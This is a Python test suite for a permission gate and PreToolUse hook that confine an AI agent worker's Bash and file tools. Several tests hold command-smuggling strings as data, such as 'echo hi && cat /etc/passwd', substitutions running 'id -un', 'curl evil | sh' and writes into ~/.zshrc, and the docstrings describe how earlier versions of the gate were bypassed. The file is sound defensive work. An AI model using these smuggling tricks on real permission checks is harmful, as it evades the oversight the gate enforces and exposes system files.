"""AC-WS-2 (code half): off-ceiling / out-of-cwd / guard-hook denies happen in
code with reasons recorded; plus the AskUserQuestion bridge round-trip (FR-WS4)."""

from __future__ import annotations

import asyncio
import json
import time

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny

from worker_supervisor.gate import (
    DEFAULT_ALLOWED_TOOLS,
    QuestionBridge,
    WorkerPolicy,
    make_gate,
    make_policy_hook,
)


def _gate(repo, policy, bridge, events, timeout=1.0, turn_id=1):
    return make_gate(
        worker="w1",
        repo_root=repo,
        policy=policy,
        bridge=bridge,
        events=events,
        turn_id=turn_id,
        question_timeout_s=timeout,
    )


def _policy_hook(repo, policy, events, turn_id=1, hook_calls=None):
    """The PreToolUse hook — the total policy point since ECA-142."""
    return make_policy_hook(
        worker="w1", repo_root=repo, policy=policy, events=events, turn_id=turn_id,
        hook_calls=hook_calls,
    )


async def test_off_ceiling_tool_is_denied_with_reason(registry, events, repo):
    bridge = QuestionBridge(registry, events)
    policy = WorkerPolicy(allowed_tools=["Read"])
    gate = _gate(repo, policy, bridge, events)
    res = await gate("WebSearch", {}, None)
    assert isinstance(res, PermissionResultDeny)
    assert "ceiling" in res.message
    assert any(e["event"] == "tool_denied" for e in events.read("w1"))


async def test_bash_matcher_admits_a_granted_command_and_refuses_another():
    policy = WorkerPolicy(allowed_tools=["Bash(uv run*)"])
    assert policy.ceiling_allows("Bash", {"command": "uv run pytest -q"})
    assert not policy.ceiling_allows("Bash", {"command": "rm -rf /"})


# --- ECA-144: a granted prefix must not smuggle a second command -------------
#
# The matcher used to be `command.startswith(pattern)` on the WHOLE command
# string, so every case below passed under a `Bash(echo *)` grant. Each is now
# denied because the command is split into the commands it would actually run and
# every one of them has to match a grant.

_ECHO = WorkerPolicy(allowed_tools=["Bash(echo *)"])


def _denial(policy, command):
    return policy.ceiling_denial("Bash", {"command": command})


def test_separator_cannot_smuggle_a_second_command():
    """Every operator Claude Code treats as a separator, plus a newline."""
    for command in (
        "echo hi && cat /etc/passwd",
        "echo hi || cat /etc/passwd",
        "echo hi ; cat /etc/passwd",
        "echo hi | cat /etc/passwd",
        "echo hi |& cat /etc/passwd",
        "echo hi & cat /etc/passwd",
        "echo hi\ncat /etc/passwd",
        "cat /etc/passwd && echo hi",  # the unmatched command need not be last
        "echo a && echo b && cat /etc/passwd",  # nor the second
    ):
        reason = _denial(_ECHO, command)
        assert reason is not None, f"smuggled a command through {command!r}"
        assert "cat /etc/passwd" in reason, reason


def test_substitution_inner_command_is_judged():
    """`$(...)`, backticks and process substitution all execute, so all are judged.

    Including inside DOUBLE quotes, where a shell still runs them — the case a
    scan that skipped quoted runs wholesale would miss.

    Each command's OUTER text is written to match the grant on its own, so the
    denial can only come from the substitution's contents.
    """
    for command in (
        "echo x $(cat /etc/passwd)",
        "echo x `cat /etc/passwd`",
        'echo "x $(cat /etc/passwd)"',
        "echo x <(cat /etc/passwd)",
        "echo x $(echo y $(cat /etc/passwd))",  # nested
        "echo x && (cat /etc/passwd)",  # subshell group
    ):
        reason = _denial(_ECHO, command)
        assert reason is not None, f"substitution ran unjudged in {command!r}"
        assert "cat /etc/passwd" in reason, reason


def test_quoting_and_escaping_keep_an_operator_literal():
    """A quoted or escaped operator is text, not a separator — it must still allow."""
    for command in (
        "echo 'hi && cat /etc/passwd'",
        'echo "hi && cat /etc/passwd"',
        "echo hi \\&\\& there",
        "echo 'a | b ; c'",
        "echo \"it's fine\"",
    ):
        assert _denial(_ECHO, command) is None, command


def test_word_boundary_is_the_space_the_author_wrote():
    """Claude Code's rule, and the reason it is worth matching its syntax exactly."""
    spaced = WorkerPolicy(allowed_tools=["Bash(ls *)"])
    assert spaced.ceiling_allows("Bash", {"command": "ls -la"})
    assert not spaced.ceiling_allows("Bash", {"command": "lsof -i"})
    unspaced = WorkerPolicy(allowed_tools=["Bash(ls*)"])
    assert unspaced.ceiling_allows("Bash", {"command": "ls -la"})
    assert unspaced.ceiling_allows("Bash", {"command": "lsof -i"})
    # ...so the no-boundary smuggle from the task report is denied on its second
    # command even under the loose form, which is the part that mattered.
    assert not unspaced.ceiling_allows("Bash", {"command": "lsof -i; rm -rf /tmp/x"})


def test_trailing_colon_star_is_a_trailing_wildcard():
    """Claude Code: `Bash(ls:*)` is an equivalent way to write `Bash(ls *)`.

    Worth pinning because `cmd:*` is the form CC's own permission dialog writes, so
    it is what an operator copying a grant out of settings.json will paste — and
    reading that colon as literal INVERTS the grant. An earlier draft of this fix
    did exactly that, and documented it in four places as intended.
    """
    spaced = WorkerPolicy(allowed_tools=["Bash(ls *)"])
    colon = WorkerPolicy(allowed_tools=["Bash(ls:*)"])
    for command in ("ls -la", "lsof", "ls"):
        assert colon.ceiling_allows("Bash", {"command": command}) == spaced.ceiling_allows(
            "Bash", {"command": command}
        ), command
    assert colon.ceiling_allows("Bash", {"command": "ls -la"})
    assert not colon.ceiling_allows("Bash", {"command": "lsof"})
    # A colon anywhere ELSE is literal, so the `:*` reading does not leak inward.
    mid = WorkerPolicy(allowed_tools=["Bash(git:* push)"])
    assert not mid.ceiling_allows("Bash", {"command": "git remote push"})
    # ...and the trailing-wildcard reading is what makes this pair behave:
    npm = WorkerPolicy(allowed_tools=["Bash(npm run test:*)"])
    assert npm.ceiling_allows("Bash", {"command": "npm run test --watch"})
    assert not npm.ceiling_allows("Bash", {"command": "npm run test:unit"})


def test_star_only_matcher_is_the_bare_grant():
    """CC documents `Bash(*)` as equivalent to bare `Bash`, so it must not be
    narrower here — in particular it must not inherit the fail-closed refusals."""
    star = WorkerPolicy(allowed_tools=["Bash(*)"])
    for command in ("echo hi > /tmp/f", "echo 'unbalanced", "rm -rf / && curl x | sh"):
        assert star.ceiling_allows("Bash", {"command": command}), command


def test_unmodelled_shell_syntax_is_refused_not_approximated():
    """Three arbitrary-command bypasses found in review, all now refused.

    Each worked because a shell's idea of where a quote or a command ends differs
    from a POSIX-single-quote scan: `$'...'` treats `\\'` as an escaped quote (so a
    naive scan desynchronises and swallows a whole `$(...)`), a `#` comment
    suppresses line continuation (so the newline after it IS a separator), and a
    shell splices `\\<newline>` before tokenising even inside double quotes (so
    `"$\\<newline>(cmd)"` is really `"$(cmd)"`). Verified against /bin/bash at the
    time: every one of these ran `id -un` while the gate said allow.
    """
    for command in (
        "echo $'\\''$(id -un)\\'",  # ANSI-C quoting desync
        "echo $'\\''`id -un`\\'",  # ...same, via backticks
        "echo hi #\\\nid -un",  # comment suppresses the continuation
        "echo hi #\\\nid -un #\\\nid -un",  # ...chains
        'echo "$\\\n(id -un)"',  # continuation splits `$` from `(`
        'echo "${x:-$\\\n(id -un)}"',
        'echo $"translated"',
        "echo hi \\\n&& cat /etc/passwd",  # a continuation anywhere
    ):
        reason = _denial(_ECHO, command)
        assert reason is not None, f"unmodelled syntax allowed: {command!r}"
        assert "refused" in reason, reason


def test_single_quotes_are_posix_not_ansi_c():
    """A backslash inside single quotes is NOT an escape, so the run ends at the
    next quote.

    Pinned deliberately: making this "smarter" (skipping `\\'`) is the tempting
    wrong fix for the `$'...'` bypass above, and it would desynchronise the scan
    from the shell in the other direction. `echo 'a\\' && cat x` really is two
    commands to a shell, and the second must be judged.
    """
    assert _denial(_ECHO, "echo 'a\\' && cat /etc/passwd") is not None
    assert _denial(_ECHO, "echo 'a\\'") is None  # ...and that one is fine alone


def test_a_wildcard_matches_a_newline_inside_a_quoted_command():
    """`*` spans newlines. A commit message is the realistic case, and nothing else
    in this suite would notice if it stopped."""
    policy = WorkerPolicy(allowed_tools=["Bash(git *)"])
    assert policy.ceiling_allows("Bash", {"command": "git commit -m 'first\n\nsecond'"})


def test_the_match_is_anchored_at_both_ends():
    """A pattern not ending in `*` must not admit a longer command — a prefix match
    here would re-widen every such grant."""
    policy = WorkerPolicy(allowed_tools=["Bash(git * main)"])
    assert policy.ceiling_allows("Bash", {"command": "git checkout main"})
    assert not policy.ceiling_allows("Bash", {"command": "git checkout main --force"})
    exact = WorkerPolicy(allowed_tools=["Bash(ls -la)"])
    assert exact.ceiling_allows("Bash", {"command": "ls -la"})
    assert not exact.ceiling_allows("Bash", {"command": "ls -la /etc"})


def test_deep_nesting_is_refused_rather_than_raising():
    """The splitter recurses on model-supplied text. Past the cap it must produce
    the documented REFUSAL, not a RecursionError — which escaped `can_use_tool` as
    an exception and wrote no audit event."""
    reason = _denial(_ECHO, "echo " + "$(" * 1200 + "true" + ")" * 1200)
    assert reason is not None and "refused" in reason, reason


def test_matching_cannot_be_made_to_hang():
    """A pattern is operator-supplied and a command is model-supplied, and the
    matcher runs in the PreToolUse hook on every call. The regex draft of this
    matcher took >5s on the first case below."""
    policy = WorkerPolicy(allowed_tools=["Bash(echo *a*a*a*a*a*a*a*aZ)", "Bash(" + "*" * 30 + "x)"])
    start = time.perf_counter()
    assert not policy.ceiling_allows("Bash", {"command": "echo " + "a" * 200})
    assert time.perf_counter() - start < 1.0


def test_a_substitution_still_leaves_its_command_an_argument():
    """Two individually-granted commands composed by substitution must not be
    refused: the substitution is replaced by a placeholder in the enclosing
    command, not deleted, so `ls *` still sees an argument."""
    policy = WorkerPolicy(allowed_tools=["Bash(git *)", "Bash(ls *)"])
    assert policy.ceiling_allows("Bash", {"command": "ls $(git rev-parse --show-toplevel)"})
    # ...and the smuggle through the same shape is still denied.
    assert not policy.ceiling_allows(
        "Bash", {"command": "ls $(git rev-parse HEAD) && rm -rf /tmp/x"}
    )


def test_command_wrappers_are_not_stripped():
    """Claude Code strips `timeout`/`time`/`nice`/`xargs`-style wrappers and a
    leading `VAR=value` before matching; this matcher does not, so those forms are
    outside a narrow grant. Documented as a delta rather than implemented: every
    wrapper stripped is a rule about what that wrapper does, and `xargs` runs
    arbitrary commands."""
    policy = WorkerPolicy(allowed_tools=["Bash(uv *)", "Bash(git *)"])
    for command in ("timeout 30 uv run pytest", "time git status", "NODE_ENV=test uv run pytest"):
        assert not policy.ceiling_allows("Bash", {"command": command}), command
    assert policy.ceiling_allows("Bash", {"command": "uv run pytest"})


def test_wildcard_matches_spaces_anywhere_in_the_pattern():
    policy = WorkerPolicy(allowed_tools=["Bash(git * main)"])
    assert policy.ceiling_allows("Bash", {"command": "git checkout main"})
    assert not policy.ceiling_allows("Bash", {"command": "git checkout dev"})


def test_every_segment_may_match_a_different_grant():
    """The live eca73-review policy shape: several narrow grants, one compound call."""
    policy = WorkerPolicy(
        allowed_tools=["Read", "Glob", "Grep", "Bash(git *)", "Bash(uv *)", "Bash(ls *)"]
    )
    assert policy.ceiling_allows("Bash", {"command": "git status && uv run pytest -q"})
    assert policy.ceiling_allows("Bash", {"command": "ls -la | git hash-object --stdin"})
    reason = _denial(policy, "git status && rm -rf x")
    assert reason is not None and "rm -rf x" in reason, reason


def test_literal_compound_grant_still_works():
    """A wildcard-free grant is compared to the whole command too.

    Claude Code documents `Bash(safe-cmd && other-cmd)` as a legitimate rule, and
    string equality against text the operator wrote out cannot smuggle anything.
    """
    policy = WorkerPolicy(allowed_tools=["Bash(git status && npm test)"])
    assert policy.ceiling_allows("Bash", {"command": "git status && npm test"})
    assert not policy.ceiling_allows("Bash", {"command": "git status && npm test && rm x"})
    assert not policy.ceiling_allows("Bash", {"command": "git status"})  # not the grant


def test_unparseable_command_is_refused_not_allowed():
    """AC#2. Each of these leaves text we cannot attribute to any command."""
    for command in (
        "echo 'unbalanced",
        'echo "unbalanced',
        "echo $(cat x",
        "echo `cat x",
        "echo hi \\",
        "echo hi )",
    ):
        reason = _denial(_ECHO, command)
        assert reason is not None, f"unparseable command allowed: {command!r}"
        assert "refused" in reason, reason


def test_redirection_is_refused_under_a_matcher_grant():
    """A redirect target is not a command, so "every command matches" says nothing
    about it. Ignoring it would let `Bash(echo *)` write any file (ECA-144's own
    class of defect); refusing is the fail-closed choice and a deliberate delta
    from Claude Code, which allows redirection inside a matched command."""
    for command in (
        "echo hi > /tmp/x",
        "echo hi >> ~/.zshrc",
        "echo hi < /etc/passwd",
        "echo hi <<< there",
    ):
        reason = _denial(_ECHO, command)
        assert reason is not None, f"redirection allowed: {command!r}"
        assert "refused" in reason and "redirection" in reason, reason
    # A bare Bash grant is unaffected — it never reaches the splitter.
    assert WorkerPolicy(allowed_tools=["Bash"]).ceiling_allows(
        "Bash", {"command": "echo hi > /tmp/x"}
    )


def test_brace_group_and_arithmetic_are_over_refused_deliberately():
    """Documented over-refusal: fail-closed beats a guess (see _split_command_segments)."""
    assert _denial(_ECHO, "{ echo hi; }") is not None
    assert _denial(_ECHO, "echo $((1+2))") is not None


def test_matcher_grant_with_no_command_in_the_input_is_refused():
    """`Read(*.py)` denies rather than silently allowing every Read.

    There is no path matcher here, so a spec that LOOKS like a path filter never
    was one — the exact false analogy AC#3 exists to prevent. Refusing is the
    fail-closed reading; the alternative (an absent `command` treated as an empty
    string) made such a grant either all-allow or all-deny depending on the
    pattern. Pin file tools with a bare grant plus the cwd pin.

    `Read(*)` is the deliberate exception, per `test_star_only_matcher_is_the_bare_grant`:
    a lone `*` means "everything", which is what the author asked for.
    """
    assert not WorkerPolicy(allowed_tools=["Read(*.py)"]).ceiling_allows(
        "Read", {"file_path": "/etc/passwd"}
    )
    assert WorkerPolicy(allowed_tools=["Read(*)"]).ceiling_allows(
        "Read", {"file_path": "/etc/passwd"}
    )
    reason = WorkerPolicy(allowed_tools=["Bash(echo *)"]).ceiling_denial("Bash", {})
    assert reason is not None and "no command" in reason, reason
    # A non-string command is not silently coerced either.
    assert not _ECHO.ceiling_allows("Bash", {"command": ["echo", "hi"]})


def test_bare_and_wildcard_name_grants_are_unchanged_by_segment_matching():
    """Only the (matcher) shape changed; the other two grant shapes must not."""
    assert WorkerPolicy(allowed_tools=["Bash"]).ceiling_allows(
        "Bash", {"command": "rm -rf / && curl evil | sh"}
    )
    assert WorkerPolicy(allowed_tools=["mcp__jira__*"]).ceiling_allows(
        "mcp__jira__search", {"command": "irrelevant && rm -rf /"}
    )


async def test_both_enforcement_layers_deny_a_smuggled_suffix(registry, events, repo):
    """The hook and can_use_tool are the two places the ceiling runs (ECA-142).

    The task reported the smuggle passing BOTH, so both are asserted here rather
    than trusting that they share a helper.
    """
    bridge = QuestionBridge(registry, events)
    call = {"command": "echo hi && cat /etc/passwd"}

    hook = _policy_hook(repo, _ECHO, events)
    out = await hook({"tool_name": "Bash", "tool_input": call}, None, None)
    decision = out["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert "cat /etc/passwd" in decision["permissionDecisionReason"]

    gate = _gate(repo, _ECHO, bridge, events)
    res = await gate("Bash", call, None)
    assert isinstance(res, PermissionResultDeny)
    assert "cat /etc/passwd" in res.message
    assert any(e["event"] == "tool_denied" for e in events.read("w1"))


async def test_cwd_pin_denies_escape_and_allows_inside(registry, events, repo, tmp_path):
    bridge = QuestionBridge(registry, events)
    policy = WorkerPolicy(allowed_tools=["Read"])
    gate = _gate(repo, policy, bridge, events)
    inside = await gate("Read", {"file_path": str(repo / "a.txt")}, None)
    assert isinstance(inside, PermissionResultAllow)
    outside = await gate("Read", {"file_path": str(tmp_path / "outside.txt")}, None)
    assert isinstance(outside, PermissionResultDeny)
    assert "escapes" in outside.message


async def test_cwd_pin_catches_symlink_escape(registry, events, repo, tmp_path):
    target = tmp_path / "secret"
    target.mkdir()
    (repo / "link").symlink_to(target)
    bridge = QuestionBridge(registry, events)
    gate = _gate(repo, WorkerPolicy(allowed_tools=["Read"]), bridge, events)
    res = await gate("Read", {"file_path": str(repo / "link" / "x.txt")}, None)
    assert isinstance(res, PermissionResultDeny)


async def test_guard_hook_deny_is_honored(registry, events, repo):
    """Guard hooks run in the PreToolUse hook since ECA-142 — see `_policy_hook`."""
    hooks_dir = repo / ".claude" / "hooks"
    hooks_dir.mkdir(parents=True)
    guard = hooks_dir / "no-writes.sh"
    guard.write_text(
        "#!/usr/bin/env bash\n"
        'echo \'{"hookSpecificOutput": {"permissionDecision": "deny",'
        ' "message": "writes are frozen"}}\'\n'
    )
    policy = WorkerPolicy(allowed_tools=["Write"], guard_hooks={"Write": "no-writes.sh"})
    res = await _policy_hook(repo, policy, events)(
        {"tool_name": "Write", "tool_input": {"file_path": str(repo / "f.txt")}}, None, None
    )
    spec = res["hookSpecificOutput"]
    assert spec["permissionDecision"] == "deny"
    assert "writes are frozen" in spec["permissionDecisionReason"]


async def test_pretooluse_hook_enforces_the_ceiling_the_cli_would_auto_approve(
    registry, events, repo
):
    """ECA-142's core: the ceiling must bind a call that never reaches can_use_tool.

    `ls` is exactly the shape the CLI auto-approves on its own (read-only, inside the
    session cwd) — measured on CLI 2.1.220, it executes with `can_use_tool` never
    invoked. So the ceiling can only bind it from the PreToolUse hook. A lane granted
    `Bash(echo*)` asking for `ls` must be denied HERE, or the grant means nothing.
    """
    policy = WorkerPolicy(allowed_tools=["Bash(echo*)"])
    hook = _policy_hook(repo, policy, events)

    denied = await hook({"tool_name": "Bash", "tool_input": {"command": "ls -a"}}, None, None)
    spec = denied["hookSpecificOutput"]
    assert spec["permissionDecision"] == "deny"
    assert "outside this worker's ceiling" in spec["permissionDecisionReason"]
    assert any(e["event"] == "tool_denied" for e in events.read("w1"))

    # The granted command is NOT decided by the hook: returning `allow` here would skip
    # can_use_tool for everything, which is the same bug from the other side. Silence
    # leaves the CLI's own auto-approval intact.
    allowed = await hook({"tool_name": "Bash", "tool_input": {"command": "echo hi"}}, None, None)
    assert allowed == {}, "the hook must express no opinion on a permitted call"


async def test_pretooluse_hook_pins_cwd_and_ignores_ask_user_question(registry, events, repo, tmp_path):
    """The cwd pin binds through the hook too; AskUserQuestion stays the bridge's."""
    policy = WorkerPolicy(allowed_tools=["Read", "AskUserQuestion"])
    hook = _policy_hook(repo, policy, events)

    outside = await hook(
        {"tool_name": "Read", "tool_input": {"file_path": str(tmp_path / "outside.txt")}},
        None,
        None,
    )
    assert "escapes" in outside["hookSpecificOutput"]["permissionDecisionReason"]

    # make_question_hook owns this tool; a second opinion here would race its park.
    question = await hook(
        {"tool_name": "AskUserQuestion", "tool_input": {"questions": []}}, None, None
    )
    assert question == {}


async def test_pretooluse_hook_survives_a_non_dict_guard_hooks(registry, events, repo):
    """A malformed `guard_hooks` must not raise out of the hook (ECA-141's wedge class).

    ECA-141 also coerces at the construction site (`WorkerPolicy.coerced`, used by
    `from_json` and the spawn dispatch) — but this hook stays defensive regardless,
    since a `WorkerPolicy` built directly (as here, and by any future caller that
    skips those two entry points) still reaches it uncoerced. Skipping a configured
    security control silently is its own defect, so the skip is recorded. It is not
    a deny: the malformed value grants nothing, and denying every call over a bad
    policy row would wedge the lane a different way.
    """
    policy = WorkerPolicy(allowed_tools=["Bash"], guard_hooks=[])  # type: ignore[arg-type]
    res = await _policy_hook(repo, policy, events)(
        {"tool_name": "Bash", "tool_input": {"command": "echo hi"}}, None, None
    )
    assert res == {}
    skips = [e for e in events.read("w1") if "guard:skipped" in e.get("reason", "")]
    assert skips, "a configured guard was skipped with no record"


def test_from_json_coerces_a_malformed_pass_through_field():
    """ECA-141: a persisted policy row with a wrong-shaped field must reload to the
    SAME default a missing field already gets, not survive as the wrong type for
    `base_tools()` / `Limits.override` / `validate_allow_env` / `mcp_servers.keys()`
    to crash on downstream. `from_json` runs on every turn reload (`engine.py`), so
    an uncoerced bad row would wedge every subsequent turn, including across a
    restart — the same failure class ECA-135/137/140 established for this daemon.
    """
    cases = [
        ('{"allowed_tools": null}', "allowed_tools", list(DEFAULT_ALLOWED_TOOLS)),
        ('{"allowed_tools": "Bash"}', "allowed_tools", list(DEFAULT_ALLOWED_TOOLS)),
        ('{"allowed_tools": [1, 2]}', "allowed_tools", list(DEFAULT_ALLOWED_TOOLS)),
        ('{"allow_env": 5}', "allow_env", []),
        ('{"allow_env": null}', "allow_env", []),
        ('{"guard_hooks": []}', "guard_hooks", {}),
        ('{"guard_hooks": "x"}', "guard_hooks", {}),
        ('{"limits": "oops"}', "limits", {}),
        ('{"limits": [1, 2]}', "limits", {}),
        ('{"mcp_servers": []}', "mcp_servers", {}),
        ('{"mcp_servers": 3}', "mcp_servers", {}),
    ]
    for raw, field, expected in cases:
        policy = WorkerPolicy.from_json(raw)
        assert getattr(policy, field) == expected, raw


async def test_pretooluse_hook_fails_CLOSED_when_its_own_body_raises(registry, events, repo):
    """The regression this hook could have introduced, and the reason for its blanket except.

    An exception out of an SDK hook callback is caught by the CLI and turned into NO
    DECISION — after which the CLI's own auto-approval runs the tool. That is the
    opposite of `can_use_tool`, where the same failure becomes a deny. Since this hook
    is the only thing policing the auto-approved subset, and since the guard hooks
    (subprocesses, filesystem probes) now run here, an unhandled exception would
    silently restore the ECA-142 defect with nothing recorded.

    Verified live during review with the body made to raise: the lane read its canary,
    `can_use_tool` was never consulted, and no `tool_denied` was written.
    """

    class Exploding:
        """Passes `_is_mapping` (it has `.get`), then raises from inside it."""

        def get(self, _key):
            raise RuntimeError("boom from inside the policy evaluation")

    policy = WorkerPolicy(allowed_tools=["Bash"], guard_hooks=Exploding())  # type: ignore[arg-type]
    res = await _policy_hook(repo, policy, events)(
        {"tool_name": "Bash", "tool_input": {"command": "echo hi"}}, None, None
    )

    spec = res["hookSpecificOutput"]
    assert spec["permissionDecision"] == "deny", "a failing policy hook must not allow"
    assert "policy hook failed" in spec["permissionDecisionReason"]
    assert "RuntimeError" in spec["permissionDecisionReason"]
    assert any("policy hook failed" in e.get("reason", "") for e in events.read("w1"))


# --- ECA-145: the hook_calls counter, plumbed into Engine._check_policy_hook_gap ---


async def test_hook_calls_counter_increments_on_allow_deny_and_ask_user_question(
    registry, events, repo
):
    """The counter's whole point is proving the hook was DISPATCHED, independent of
    what it decided — so every shape of call must bump element 0, including the
    AskUserQuestion no-op (matcher=None fires for it too; see `make_policy_hook`).
    Element 1 must bump ONLY for the AskUserQuestion call — see
    `Engine._check_policy_hook_gap` for why the caller needs that split rather than
    inferring it from `outcome.tools`."""
    policy = WorkerPolicy(allowed_tools=["Bash(echo*)"])
    hook_calls = [0, 0]
    hook = _policy_hook(repo, policy, events, hook_calls=hook_calls)

    await hook({"tool_name": "Bash", "tool_input": {"command": "echo hi"}}, None, None)  # allow
    assert hook_calls == [1, 0]
    await hook({"tool_name": "Bash", "tool_input": {"command": "ls -a"}}, None, None)  # deny
    assert hook_calls == [2, 0]
    await hook({"tool_name": "AskUserQuestion", "tool_input": {}}, None, None)  # no-op
    assert hook_calls == [3, 1]


async def test_hook_calls_counter_increments_even_when_the_hook_raises(registry, events, repo):
    """The counter must be bumped BEFORE anything that can raise or short-circuit —
    a call that reaches the hook and then fails inside it was still DISPATCHED, which
    is the only fact this counter exists to record (see `_check_policy_hook_gap`:
    comparing invocations to tool uses must not undercount a hook that fired and then
    errored, only a hook that never fired at all)."""

    class Exploding:
        def get(self, _key):
            raise RuntimeError("boom")

    policy = WorkerPolicy(allowed_tools=["Bash"], guard_hooks=Exploding())  # type: ignore[arg-type]
    hook_calls = [0, 0]
    hook = _policy_hook(repo, policy, events, hook_calls=hook_calls)
    await hook({"tool_name": "Bash", "tool_input": {"command": "echo hi"}}, None, None)
    assert hook_calls == [1, 0]


async def test_a_broken_event_log_still_denies(registry, events, repo, cfg, monkeypatch):
    """The deny must not be conditional on the record being written.

    `EventLog.emit` is not exception-free, and a lane can break its own log file (one
    symlink — there is no lane-to-lane boundary here, same uid). Emitting BEFORE
    building the return value turned every subsequent denial into a raise, which the
    CLI converts to a silent allow. Ordering, not the record, is the control.
    """

    def explode(*a, **kw):
        raise OSError(62, "Too many levels of symbolic links")

    monkeypatch.setattr(events, "emit", explode)
    policy = WorkerPolicy(allowed_tools=["Bash(echo*)"])
    res = await _policy_hook(repo, policy, events)(
        {"tool_name": "Bash", "tool_input": {"command": "ls -a"}}, None, None
    )
    assert res["hookSpecificOutput"]["permissionDecision"] == "deny"


async def test_question_bridge_round_trip(registry, events, repo):
    await registry.spawn_worker("w1", str(repo), {})
    tid = await registry.enqueue_turn("w1", "asking turn")
    bridge = QuestionBridge(registry, events)
    gate = _gate(repo, WorkerPolicy(), bridge, events, timeout=5.0, turn_id=tid)
    payload = {"questions": [{"question": "Deploy now?", "options": ["yes", "no"]}]}

    ask_task = asyncio.create_task(gate("AskUserQuestion", payload, None))
    # wait for it to park, then answer over the "control surface"
    for _ in range(50):
        pending = await registry.pending_questions("w1")
        if pending:
            break
        await asyncio.sleep(0.02)
    assert pending, "question never parked"
    assert json.loads(pending[0]["questions"]) == payload["questions"]
    assert await bridge.answer(pending[0]["id"], "yes — ship it")

    res = await ask_task
    assert isinstance(res, PermissionResultDeny)
    assert res.message == "The user responded: yes — ship it"
    assert not res.interrupt


async def test_question_timeout_interrupts_turn(registry, events, repo):
    await registry.spawn_worker("w1", str(repo), {})
    tid = await registry.enqueue_turn("w1", "asking turn")
    bridge = QuestionBridge(registry, events)
    gate = _gate(repo, WorkerPolicy(), bridge, events, timeout=0.05, turn_id=tid)
    res = await gate("AskUserQuestion", {"questions": [{"question": "?"}]}, None)
    assert isinstance(res, PermissionResultDeny)
    assert res.interrupt is True
    qs = await registry.db.execute("SELECT state FROM questions")
    states = [r["state"] for r in await qs.fetchall()]
    assert states == ["timed_out"]


def test_base_tools_always_include_escalation_and_skills():
    policy = WorkerPolicy(allowed_tools=["Read", "Bash(uv run*)"])
    base = policy.base_tools()
    assert "AskUserQuestion" in base and "Skill" in base
    assert "Bash" in base and "Read" in base


def test_mcp_name_wildcard_grants_whole_server(events, repo):
    """ECA-100: 'mcp__jira__*' grants every tool from that server (name-prefix),
    but not other servers or off-ceiling tools."""
    policy = WorkerPolicy(allowed_tools=["Read", "mcp__jira__*"])
    assert policy.ceiling_allows("mcp__jira__search", {})
    assert policy.ceiling_allows("mcp__jira__create_issue", {})
    assert policy.ceiling_allows("Read", {})
    assert not policy.ceiling_allows("mcp__langfuse__trace", {})  # a different server
    assert not policy.ceiling_allows("WebSearch", {})


def test_base_tools_skips_mcp_specs():
    """MCP tool existence comes from mcp_servers, not the built-in --tools floor:
    a literal 'mcp__server__*' must never leak into base_tools()."""
    policy = WorkerPolicy(allowed_tools=["Read", "mcp__jira__*", "Bash"])
    base = policy.base_tools()
    assert "Read" in base and "Bash" in base
    assert "Skill" in base and "AskUserQuestion" in base
    assert not any(t.startswith("mcp__") for t in base)


def test_policy_mcp_servers_round_trip():
    """The per-lane MCP grant survives the workers.policy JSON round-trip."""
    servers = {
        "jira": {"type": "stdio", "command": "npx", "args": ["-y", "mcp-remote", "u"]},
        "langfuse": {"type": "http", "url": "https://lf/api/public/mcp"},
    }
    p = WorkerPolicy(allowed_tools=["Read", "mcp__jira__*"], mcp_servers=servers)
    assert WorkerPolicy.from_json(p.to_json()).mcp_servers == servers
    # Default (no grant) round-trips to empty, never None.
    assert WorkerPolicy.from_json(WorkerPolicy().to_json()).mcp_servers == {}
